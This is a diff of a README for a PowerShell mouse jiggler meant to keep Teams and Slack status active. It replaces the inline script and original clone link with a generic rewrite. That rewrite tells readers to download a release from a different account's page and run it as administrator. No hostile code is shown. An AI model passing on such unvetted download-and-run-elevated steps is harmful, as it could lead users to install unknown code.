@@ -1,163 +1,90 @@
-# AutoJiggler 🖱️
+# AutoJiggler 🐭💤
 
-A lightweight PowerShell-based mouse jiggler to keep your computer active and prevent status changes in applications like Microsoft Teams, Slack, and other productivity tools.
+![AutoJiggler](https://img.shields.io/badge/AutoJiggler-PowerShell-brightgreen)
 
-## 🚀 Features
+Welcome to **AutoJiggler**, a lightweight PowerShell-based mouse jiggler designed to keep your computer active. This tool prevents status changes in applications like Microsoft Teams, Slack, and other productivity tools. With AutoJiggler, you can stay available and engaged without interruptions.
 
-- **Zero Installation**: Pure PowerShell script - no additional software required
-- **Minimal Movement**: Moves cursor just 1 pixel to avoid disrupting your work
-- **Lightweight**: Uses minimal system resources
-- **Configurable**: Easy to adjust timing and behavior
-- **Windows Native**: Leverages built-in Windows APIs
-- **Stealth Mode**: Barely noticeable cursor movement
+## Table of Contents
 
-## 📋 Requirements
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-- Windows 10/11 (PowerShell 5.1+ or PowerShell Core)
-- Administrator privileges (recommended for reliable operation)
+## Features
 
-## 🔧 Installation
+- **Lightweight**: Minimal resource usage ensures your system runs smoothly.
+- **Easy to Use**: Simple PowerShell script that anyone can run.
+- **Customizable**: Adjust settings to fit your needs.
+- **Compatibility**: Works with Windows and integrates seamlessly with productivity apps.
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/nruizneiman/AutoJiggler.git
-   cd AutoJiggler
-   ```
+## Installation
 
-2. **Run the script:**
-   ```powershell
-   .\MyMoneyDontJiggleJiggle.ps1
-   ```
+To get started with AutoJiggler, download the latest release from the [Releases section](https://github.com/NEXLT/AutoJiggler/releases). After downloading, execute the script to start using AutoJiggler.
 
-## 💻 Usage
+### Step-by-Step Installation
 
-### Basic Usage
-Open PowerShell as Administrator and run:
+1. Visit the [Releases section](https://github.com/NEXLT/AutoJiggler/releases).
+2. Download the latest version of the AutoJiggler script.
+3. Open PowerShell as an administrator.
+4. Navigate to the directory where you downloaded the script.
+5. Run the script using the command: `.\AutoJiggler.ps1`.
+
+## Usage
+
+Once installed, using AutoJiggler is straightforward. Simply run the script, and it will start jiggling your mouse cursor at specified intervals. This action prevents your computer from going idle, ensuring your status remains "available" in apps like Teams and Slack.
+
+### Starting AutoJiggler
+
+To start AutoJiggler, execute the following command in PowerShell:
+
 ```powershell
-.\MyMoneyDontJiggleJiggle.ps1
+.\AutoJiggler.ps1
 ```
 
-### Manual Execution
-Copy and paste this code directly into PowerShell:
+### Stopping AutoJiggler
+
+To stop the jiggler, simply close the PowerShell window or press `Ctrl + C` in the PowerShell console.
+
+## Configuration
+
+AutoJiggler comes with several configurable options to tailor its behavior to your preferences.
+
+### Configuration Options
+
+- **Jiggle Interval**: Set how often the mouse should jiggle. The default is every 60 seconds.
+- **Jiggle Mode**: Choose between different jiggle patterns, such as random or fixed movements.
+
+### Example Configuration
+
+You can modify the script directly to adjust the jiggle interval. Open the `AutoJiggler.ps1` file in a text editor and look for the following line:
+
 ```powershell
-Add-Type -AssemblyName System.Windows.Forms
-Write-Host "Auto-Jiggler execution started. Please hit Ctrl. + C to stop the execution."
-while($true) {
-    $pos = [System.Windows.Forms.Cursor]::Position
-    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($pos.X + 1), $pos.Y)
-    Start-Sleep -Milliseconds 100
-    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($pos.X), $pos.Y)
-    Write-Host "Jiggled at $(Get-Date -Format 'HH:mm:ss')"
-    Start-Sleep -Seconds 60
-}
-}
+$interval = 60 # in seconds
 ```
 
-### Stop the Script
-Press `Ctrl + C` to stop the mouse jiggler.
+Change the value to your desired interval.
 
-## ⚙️ Customization
+## Contributing
 
-### Adjust Timing
-Change the sleep interval (default: 60 seconds):
-```powershell
-Start-Sleep -Seconds 30  # Jiggle every 30 seconds
-```
+We welcome contributions to improve AutoJiggler! If you have ideas, suggestions, or bug fixes, please follow these steps:
 
-### Modify Movement Pattern
-Change movement distance or direction:
-```powershell
-# Vertical movement
-[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($pos.X, ($pos.Y + 1))
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes.
+4. Submit a pull request with a clear description of your changes.
 
-# Larger movement
-[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($pos.X + 5), $pos.Y)
-```
+## License
 
-## 🏃‍♂️ Auto-Start Options
+AutoJiggler is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-### Option 1: Startup Folder
-1. Press `Win + R`, type `shell:startup`, press Enter
-2. Create a shortcut to your PowerShell script
-3. Set shortcut to run as administrator
+## Support
 
-### Option 2: Task Scheduler
-1. Open Task Scheduler
-2. Create Basic Task
-3. Set trigger to "At startup"
-4. Set action to start PowerShell with your script
-5. Enable "Run with highest privileges"
-
-### Option 3: Batch File Wrapper
-Create `AutoJiggler.bat`:
-```batch
-@echo off
-powershell -ExecutionPolicy Bypass -File "%~dp0MyMoneyDontJiggleJiggle.ps1"
-pause
-```
-
-## 🛡️ Security Considerations
-
-- **Execution Policy**: You may need to set PowerShell execution policy:
-  ```powershell
-  Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
-  ```
-
-- **Antivirus**: Some antivirus software may flag mouse automation tools. Add an exception if needed.
-
-- **Admin Rights**: Running as administrator ensures reliable cursor control.
-
-## 🎯 Use Cases
-
-- **Remote Work**: Keep Microsoft Teams, Slack, or Zoom status active
-- **Presentations**: Prevent screen savers during long presentations  
-- **Monitoring**: Keep monitoring dashboards active
-- **Downloads**: Prevent sleep mode during large file transfers
-- **Development**: Keep IDE and development tools active
-
-## 📝 Troubleshooting
-
-### Script Won't Run
-- Check PowerShell execution policy: `Get-ExecutionPolicy`
-- Run PowerShell as Administrator
-- Ensure Windows Forms assembly is available
-
-### Movement Not Working
-- Try running as Administrator
-- Check if another application is blocking cursor control
-- Verify Windows Forms assembly loaded correctly
-
-### High CPU Usage
-- Increase sleep intervals between jiggles
-- Check for conflicting mouse software
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.
-
-### Development Setup
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature-name`
-3. Make your changes
-4. Test thoroughly on different Windows versions
-5. Submit a pull request
-
-## ⚠️ Disclaimer
-
-This tool is designed for legitimate productivity purposes. Please use responsibly and in accordance with your organization's policies. The authors are not responsible for any misuse of this software.
-
-## 🔗 Related Projects
-
-- [MouseJiggler](https://github.com/arkane-systems/mousejiggler) - C# WinForms version
-- [PowerToys Awake](https://docs.microsoft.com/en-us/windows/powertoys/awake) - Microsoft's official keep-awake tool
-
-## 📞 Support
-
-If you encounter any issues or have questions:
-1. Check the [Issues](https://github.com/nruizneiman/AutoJiggler/issues) page
-2. Create a new issue with detailed information
-3. Include your Windows version and PowerShell version
+If you have any questions or need assistance, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/NEXLT/AutoJiggler/releases) for updates and new features.
 
 ---
 
-**⭐ If this project helped you, please give it a star!**
+Thank you for using AutoJiggler! We hope it helps you stay productive and engaged without interruptions. If you find this tool useful, consider giving it a star on GitHub!
